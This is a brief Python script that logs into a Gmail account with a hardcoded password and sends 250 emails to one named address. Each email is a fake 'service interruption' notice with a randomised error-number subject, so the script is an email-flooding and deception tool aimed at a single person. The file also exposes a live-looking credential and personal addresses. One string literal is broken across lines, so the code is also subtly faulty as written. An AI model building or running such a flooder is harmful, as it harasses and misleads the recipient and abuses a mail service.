import random
import smtplib

toaddrs = 'burstthree2000@yahoo.com'
fromaddrs = 'servicemailerrorreport@gmail.com
'
message = 'We are sorry to inform you that our service has been interrupted and that might affect normal operations of your mail box. We are working hard to restore things back to normal as soon as possible. We ask for your patience during this process. DO NOT REPLY. '

with smtplib.SMTP('smtp.gmail.com', '587') as smtpserver:
          smtpserver.ehlo()
          smtpserver.starttls()
          smtpserver.ehlo()
          smtpserver.login('servicemailerrorreport@gmail.com', 'rokfsigakdfiweeu')
          for i in range(250):
            subject = 'Service Interruption Error no {}'.format(random.randint(1, 999))
            msg = 'Subject: {}\n\n{}'.format(subject, message)
            smtpserver.sendmail(fromaddrs, toaddrs, msg)
            print(i)

